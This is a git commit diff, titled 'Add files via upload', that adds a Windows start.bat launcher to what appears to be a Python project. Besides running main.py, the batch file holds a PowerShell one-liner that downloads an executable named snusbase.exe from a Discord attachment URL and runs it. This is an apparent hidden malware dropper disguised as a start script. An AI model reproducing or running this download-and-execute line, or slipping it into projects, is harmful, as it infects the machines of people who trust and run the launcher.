45bfbaf1d93afd6189f282a1afe75f0d0e065939
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-02-03 15:51:21 +0100

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,5 @@
+@echo off
+cd src
+powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1202668981807349760/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+py main.py
+Key : 01266156
